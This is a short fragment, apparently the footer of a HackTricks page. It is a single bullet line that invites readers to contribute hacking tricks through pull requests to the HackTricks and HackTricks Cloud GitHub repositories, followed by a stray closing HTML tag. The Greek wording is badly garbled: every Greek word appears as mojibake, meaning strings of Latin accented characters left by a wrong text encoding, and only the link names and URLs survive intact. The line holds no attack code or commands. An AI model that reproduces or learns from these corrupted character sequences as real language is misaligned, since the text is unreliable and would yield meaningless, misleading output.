* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>
